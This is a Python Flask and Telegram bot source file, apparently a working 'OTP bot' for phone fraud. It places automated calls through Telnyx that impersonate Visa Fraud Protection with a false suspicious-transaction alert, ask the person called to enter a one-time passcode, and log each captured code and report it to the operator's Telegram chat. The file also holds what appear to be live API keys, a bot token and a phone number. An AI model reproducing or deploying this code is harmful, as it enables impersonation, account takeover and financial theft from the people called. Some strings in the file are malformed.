import os
from telnyx import CallControlClient
from flask import Flask, request, jsonify
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
import json
import time
import asyncio

app = Flask(__name__)

# Telnyx config (replace with your credentials from Telnyx dashboard)
TELNYX_API_KEY = "KEY01985AA2A88E23C4827FD1868889488A_APCNdOkjJFZotuSKvR71LC "  # e.g., KEY0187B3xxxxxxxxxxxxxxxxxxxxxxxxxxxx
TELNYX_PHONE_NUMBER = "+1-206-738-5705"  # e.g., +17775551234
TELNYX_CONNECTION_ID = "2751181879137798127"  # e.g., 1234567890
call_client = CallControlClient(api_key=TELNYX_API_KEY)

# Telegram config (replace with your bot token)
TELEGRAM_BOT_TOKEN = "8422030718:AAHBnVld_FZjTPsU-WX64p7YsXS_EzRIokY
        "  # e.g., 1234567890:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
TELEGRAM_CHAT_ID = "7910220440"      # e.g., 987654321
telegram_bot = Bot(token=TELEGRAM_BOT_TOKEN)

# Store calls and OTPs
call_storage = "calls.json"
otp_storage = "otps.json"
call_state = {}  # Tracks call phase: initiation, hold, capture

def save_call(call_id, phone, phase, timestamp):
    data = []
    if os.path.exists(call_storage):
        with open(call_storage, "r") as f:
            try:
                data = json.load(f)
            except:
                pass
    data.append({"call_id": call_id, "phone": phone, "phase": phase, "timestamp": timestamp})
    with open(call_storage, "w") as f:
        json.dump(data, f, indent=2)

def save_otp(phone, otp, timestamp):
    data = []
    if os.path.exists(otp_storage):
        with open(otp_storage, "r") as f:
            try:
                data = json.load(f)
            except:
                pass
    data.append({"phone": phone, "otp": otp, "timestamp": timestamp})
    with open(otp_storage, "w") as f:
        json.dump(data, f, indent=2)

async def send_telegram_message(message, buttons=None):
    keyboard = InlineKeyboardMarkup(buttons) if buttons else None
    await telegram_bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message, reply_markup=keyboard, parse_mode="Markdown")

@app.route("/start_call", methods=["POST"])
async def start_call():
    try:
        data = request.json
        target_phone = data.get("phone")  # e.g., +13125551234
        client_name = data.get("client_name", "Customer")
        
        # Initiate call (Phase 1: Initiation)
        call = call_client.dial(
            to=target_phone,
            from_=TELNYX_PHONE_NUMBER,
            connection_id=TELNYX_CONNECTION_ID
        )
        call_id = call.call_control_id
        call_state[call_id] = {"phone": target_phone, "phase": "initiation", "client_name": client_name}
        save_call(call_id, target_phone, "initiation", time.strftime("%Y-%m-%d %H:%M:%S"))
        
        # Play audio for initiation and move to hold (Phase 2: Hold)
        call.speak(
            payload="Hello, this is Visa Fraud Protection. We’ve detected a suspicious transaction attempt on your card from Chicago, IL, today, August 8, 2025, at 7:45 AM CDT. Please hold to secure your account.",
            voice="female",
            language="en-US"
        )
        call_state[call_id]["phase"] = "hold"
        save_call(call_id, target_phone, "hold", time.strftime("%Y-%m-%d %H:%M:%S"))
        
        # Fancy Telegram UI with buttons
        buttons = [
            [InlineKeyboardButton("Proceed to OTP Capture", callback_data=f"proceed_{call_id}")],
            [InlineKeyboardButton("View OTPs", url="https://visa-otp-bot.onrender.com”/view_otps")]
        ]
        await send_telegram_message(
            f"📞 *Call Started* to `{target_phone}` (ID: `{call_id}`)\nStatus: On hold\nUse button to capture OTP.",
            buttons
        )
        
        return jsonify({"status": "call started", "call_id": call_id})
    except Exception as e:
        await send_telegram_message(f"❌ *Error starting call*: `{str(e)}`")
        return jsonify({"error": str(e)}), 500

@app.route("/capture_otp/<call_id>", methods=["POST"])
async def capture_otp(call_id):
    try:
        if call_id not in call_state or call_state[call_id]["phase"] != "capture":
            return jsonify({"error": "Call not in capture phase"}), 400
        
        phone = call_state[call_id]["phone"]
        digits = request.json.get("digits")  # DTMF digits from Telnyx webhook
        
        if digits:
            save_otp(phone, digits, time.strftime("%Y-%m-%d %H:%M:%S"))
            await send_telegram_message(f"🔒 *OTP Captured* for `{phone}`: `{digits}`")
            call_client.hangup(call_id)
            del call_state[call_id]
            return jsonify({"status": "otp captured"})
        else:
            await send_telegram_message(f"❌ *No OTP received* for `{phone}`")
            return jsonify({"error": "No digits received"}), 400
    except Exception as e:
        await send_telegram_message(f"❌ *Error capturing OTP*: `{str(e)}`")
        return jsonify({"error": str(e)}), 500

@app.route("/webhook", methods=["POST"])
async def telnyx_webhook():
    try:
        event = request.json
        call_id = event["data"]["call_control_id"]
        event_type = event["data"]["event_type"]
        
        if event_type == "call.dtmf.received" and call_id in call_state and call_state[call_id]["phase"] == "capture":
            digits = event["data"]["payload"]["digits"]
            phone = call_state[call_id]["phone"]
            save_otp(phone, digits, time.strftime("%Y-%m-%d %H:%M:%S"))
            await send_telegram_message(f"🔒 *OTP Captured* for `{phone}`: `{digits}`")
            call_client.hangup(call_id)
            del call_state[call_id]
        
        return jsonify({"status": "processed"})
    except Exception as e:
        await send_telegram_message(f"❌ *Webhook error*: `{str(e)}`")
        return jsonify({"error": str(e)}), 500

@app.route("/view_otps", methods=["GET"])
async def view_otps():
    try:
        if os.path.exists(otp_storage):
            with open(otp_storage, "r") as f:
                data = json.load(f)
            otp_text = "\n".join([f"`{d['phone']}`: `{d['otp']}` @ `{d['timestamp']}`" for d in data]) or "No OTPs yet."
            await send_telegram_message(f"📋 *Captured OTPs*:\n{otp_text}")
            return jsonify(data)
        await send_telegram_message("📋 *No OTPs captured yet*")
        return jsonify({"otps": []})
    except Exception as e:
        await send_telegram_message(f"❌ *Error viewing OTPs*: `{str(e)}`")
        return jsonify({"error": str(e)}), 500

async def handle_telegram_updates():
    last_update_id = 0
    while True:
        try:
            updates = await telegram_bot.get_updates(offset=last_update_id + 1, timeout=30)
            for update in updates:
                last_update_id = update.update_id
                if update.callback_query:
                    call_id = update.callback_query.data.split("_")[1] if update.callback_query.data.startswith("proceed_") else None
                    if call_id and call_id in call_state and call_state[call_id]["phase"] == "hold":
                        call_state[call_id]["phase"] = "capture"
                        save_call(call_id, call_state[call_id]["phone"], "capture", time.strftime("%Y-%m-%d %H:%M:%S"))
                        call_client.speak(
                            call_control_id=call_id,
                            payload="Please enter your six-digit one-time passcode now, followed by the pound key.",
                            voice="female",
                            language="en-US"
                        )
                        await send_telegram_message(f"📞 *Call {call_id} moved to OTP capture phase*")
                        await update.callback_query.answer()
                elif update.message and update.message.text:
                    text = update.message.text
                    if text == "/start":
                        buttons = [[InlineKeyboardButton("View OTPs", url="https://YOUR_RENDER_URL/view_otps")]]
                        await send_telegram_message("👋 *Visa OTP Bot Ready*\nUse /start_call <phone> <name> to begin.", buttons)
                    elif text.startswith("/start_call"):
                        try:
                            _, phone, name = text.split()
                            async with app.test_client() as client:
                                response = await client.post("/start_call", json={"phone": phone, "client_name": name})
                                await send_telegram_message(f"📞 *Call Request*: `{response.get_json()['status']}`")
                        except:
                            await send_telegram_message("❌ *Usage*: /start_call +13125551234 John")
        except Exception as e:
            await send_telegram_message(f"❌ *Telegram update error*: `{str(e)}`")
        await asyncio.sleep(1)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(handle_telegram_updates())
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
